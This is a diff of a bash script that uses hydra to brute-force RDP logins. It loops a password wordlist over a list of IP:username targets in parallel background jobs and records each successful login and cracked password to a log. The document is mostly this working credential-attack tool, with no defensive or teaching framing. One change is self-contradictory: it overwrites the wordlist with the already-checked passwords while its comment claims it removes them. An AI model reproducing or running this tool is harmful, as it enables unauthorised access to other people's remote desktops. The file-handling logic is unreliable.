@@ -14,16 +14,17 @@ checked_passwords_log="checked_passwords_log.txt"
 [[ ! -f "$temp_passwords_file" ]] && touch "$temp_passwords_file"
 [[ ! -f "$checked_passwords_log" ]] && touch "$checked_passwords_log"
 
-# Function to clean up (does not modify passwords.txt)
+# Function to clean up and save passwords before exiting
 cleanup() {
-    echo "Saving progress in temp_passwords.txt..."
+    echo "Saving current state of passwords..."
+    mv "$temp_passwords_file" "$passwords_file"
     exit
 }
 
 # Trap signals to call cleanup function
 trap cleanup SIGINT SIGTERM
 
-# Check if input files exist
+# Check if the input files exist
 if [[ ! -f "$iplog_file" || ! -f "$passwords_file" ]]; then
     echo -e "\e[31mOne or both files do not exist, exiting.\e[0m"
     exit 1
@@ -35,7 +36,7 @@ mapfile -t passwords < "$passwords_file"
 
 successful_attempts=0
 total_passwords=${#passwords[@]}
-total_hosts=${#iplog_entries[@]}
+total_hosts=${#iplog_entries[@]}  # Total number of hosts
 start_time=$(date +%s)
 
 # Function to attempt login
@@ -59,7 +60,6 @@ attempt_login() {
     if echo "$hydra_output" | grep -q "success"; then
         echo "$(date '+%Y-%m-%d %H:%M:%S') - Successful login with $username on rdp://$rdp_ip using password: $password" >> "$success_log_file"
         ((successful_attempts++))
-        echo -e "\e[32mSUCCESS: $username@$rdp_ip with password: $password\e[0m"
     fi
 }
 
@@ -74,7 +74,6 @@ for index in "${!passwords[@]}"; do
     password_start_time=$(date +%s)
     attempts=0  # Counter for successful attempts with the current password
 
-    # Loop through each IP:login pair
     for entry in "${iplog_entries[@]}"; do
         # Attempt login
         attempt_login "$entry" "$password" &
@@ -95,25 +94,29 @@ for index in "${!passwords[@]}"; do
 
     # Calculate speed of attempts (in seconds per attempt)
     if (( attempts > 0 )); then
-        speed=$(bc -l <<< "scale=2; $password_duration / $attempts")
+        speed=$(( password_duration / attempts ))  # Use integer division
     else
-        speed="N/A"
+        speed="N/A"  # If no attempts, set speed to N/A
     fi
 
-    # Indicate that the password has been checked
-    echo -e "Checked password '$password': Time taken: $password_duration seconds, Speed: $speed seconds/attempt."
-    echo "$password" >> "$temp_passwords_file"  
+    # Indicate that the password has been checked and remove it from the list
+    echo "$password was deleted from the list of passwords (Lines left: $((total_passwords - (index + 1))))"
+    echo -e "Time taken for password '$password': $password_duration seconds, Speed: $speed seconds/attempt."
 
-    echo "$password was logged as checked." >> "$checked_passwords_log"
+    # Save the checked password for final cleanup
+    echo "$password" >> "$temp_passwords_file"
 done
 
 # Wait for any remaining background jobs
 wait
 
+# Create a new passwords file without the checked passwords
+mv "$temp_passwords_file" "$passwords_file"
+
 # Calculate elapsed time and estimate remaining time
 end_time=$(date +%s)
 elapsed_time=$(( end_time - start_time ))
-avg_time_per_password=$(( elapsed_time / successful_attempts ))
+avg_time_per_password=$(( elapsed_time / (successful_attempts + 1) ))  # +1 to prevent division by zero
 remaining_passwords=$(wc -l < "$passwords_file")
 estimated_time=$(( remaining_passwords * avg_time_per_password ))
 
